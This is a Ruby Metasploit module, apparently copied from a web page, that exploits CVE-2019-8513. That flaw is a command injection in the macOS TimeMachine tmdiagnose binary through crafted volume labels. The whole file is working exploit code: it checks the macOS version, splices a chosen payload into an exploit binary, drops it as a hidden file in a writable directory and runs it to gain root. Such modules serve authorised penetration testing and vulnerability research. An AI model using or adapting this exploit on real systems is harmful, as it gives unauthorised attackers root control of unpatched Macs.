# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::OSX::Priv
  include Msf::Post::OSX::System
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;          => &#039;Mac OS X TimeMachine (tmdiagnose) Command Injection Privilege Escalation&#039;,
      &#039;Description&#039;   => %q{
          This module exploits a command injection in TimeMachine on macOS <= 10.14.3 in
        order to run a payload as root. The tmdiagnose binary on OSX <= 10.14.3 suffers
        from a command injection vulnerability that can be exploited by creating a
        specially crafted disk label.

          The tmdiagnose binary uses awk to list every mounted volume, and composes
        shell commands based on the volume labels. By creating a volume label with the
        backtick character, we can have our own binary executed with root priviledges.
      },
      &#039;License&#039;       => MSF_LICENSE,
      &#039;Author&#039;        => [
          &#039;CodeColorist&#039;, # Discovery and exploit
          &#039;timwr&#039;,        # Metasploit module
      ],
      &#039;References&#039;     => [
          [&#039;CVE&#039;, &#039;2019-8513&#039;],
          [&#039;URL&#039;, &#039;https://medium.com/0xcc/rootpipe-reborn-part-i-cve-2019-8513-timemachine-root-command-injection-47e056b3cb43&#039;],
          [&#039;URL&#039;, &#039;https://support.apple.com/en-in/HT209600&#039;],
          [&#039;URL&#039;, &#039;https://github.com/ChiChou/sploits&#039;],
      ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;Targets&#039;        => [
          [ &#039;Mac OS X x64 (Native Payload)&#039;, { &#039;Arch&#039; => ARCH_X64, &#039;Platform&#039; => [ &#039;osx&#039; ] } ],
          [ &#039;Python payload&#039;,                { &#039;Arch&#039; => ARCH_PYTHON, &#039;Platform&#039; => [ &#039;python&#039; ] } ],
          [ &#039;Command payload&#039;,               { &#039;Arch&#039; => ARCH_CMD, &#039;Platform&#039; => [ &#039;unix&#039; ] } ],
      ],
      &#039;DisclosureDate&#039; => &#039;Apr 13 2019&#039;))
    register_advanced_options [
      OptString.new(&#039;WritableDir&#039;, [ true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039; ])
    ]
  end

  def upload_executable_file(filepath, filedata)
    print_status("Uploading file: &#039;#{filepath}&#039;")
    write_file(filepath, filedata)
    chmod(filepath)
    register_file_for_cleanup(filepath)
  end

  def check
    version = Gem::Version.new(get_system_version)
    if version >= Gem::Version.new(&#039;10.14.4&#039;)
      CheckCode::Safe
    else
      CheckCode::Appears
    end
  end

  def exploit
    if check != CheckCode::Appears
      fail_with Failure::NotVulnerable, &#039;Target is not vulnerable&#039;
    end

    if is_root?
      fail_with Failure::BadConfig, &#039;Session already has root privileges&#039;
    end

    unless writable? datastore[&#039;WritableDir&#039;]
      fail_with Failure::BadConfig, "#{datastore[&#039;WritableDir&#039;]} is not writable"
    end

    exploit_data = File.binread(File.join(Msf::Config.data_directory, "exploits", "CVE-2019-8513", "exploit" ))
    if target[&#039;Arch&#039;] == ARCH_X64
      root_cmd = payload.encoded
    else
      root_cmd = payload.raw
      if target[&#039;Arch&#039;] == ARCH_PYTHON
        root_cmd = "echo \"#{root_cmd}\" | python"
      end
      root_cmd = "CMD:#{root_cmd}"
    end
    if root_cmd.length > 1024
      fail_with Failure::PayloadFailed, "Payload size (#{root_cmd.length}) exceeds space in payload placeholder"
    end

    placeholder_index = exploit_data.index(&#039;ROOT_PAYLOAD_PLACEHOLDER&#039;)
    exploit_data[placeholder_index, root_cmd.length] = root_cmd

    exploit_file = "#{datastore[&#039;WritableDir&#039;]}/.#{Rex::Text::rand_text_alpha_lower(6..12)}"
    upload_executable_file(exploit_file, exploit_data)

    print_status("Executing exploit &#039;#{exploit_file}&#039;")
    result = cmd_exec(exploit_file)
    print_status("Exploit result:\n#{result}")
  end
end

